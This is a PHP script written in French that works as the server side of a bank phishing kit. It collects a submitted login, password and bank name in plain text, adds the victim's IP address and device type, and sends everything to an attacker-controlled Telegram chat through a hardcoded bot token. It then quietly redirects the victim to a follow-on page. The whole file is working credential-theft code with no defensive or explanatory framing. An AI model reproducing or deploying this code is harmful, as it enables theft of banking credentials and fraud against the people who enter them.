<?php
// telegram_handler.php

// 1. Configuration Telegram
$BOT_TOKEN = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$CHAT_ID = "7796457959";

// 2. Récupération des données en CLAIR
$login = $_POST['login'] ?? 'Non fourni';
$code = $_POST['motdepasse'] ?? 'Non fourni';
$banque = $_POST['bank'] ?? 'Non fourni';

// 3. Informations techniques basiques
$infos_utilisateur = [
    'ID Unique' => 'CA-'.uniqid(),
    'Date/Heure' => date('d/m/Y H:i:s'),
    'Adresse IP' => $_SERVER['REMOTE_ADDR'],
    'Appareil' => preg_match('/Mobile|Android|iPhone/i', $_SERVER['HTTP_USER_AGENT']) ? 'Mobile' : 'Ordinateur'
];

// 4. Message Telegram clair
$message = "🚨 NOUVEL ACCÈS DÉTECTÉ 🚨\n\n";
$message .= "🏦 Banque : $banque\n";
$message .= "🔢 Identifiant : $login\n";
$message .= "🔑 Code : $code\n\n";
$message .= "📌 Métadonnées :\n";
foreach($infos_utilisateur as $key => $value) {
    $message .= "• $key : $value\n";
}

// 5. Envoi à Telegram
$url_telegram = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?" . http_build_query([
    'chat_id' => $CHAT_ID,
    'text' => $message
]);
file_get_contents($url_telegram);

// 6. Redirection exacte comme spécifié
header("Location: ../final.php");
exit;
?>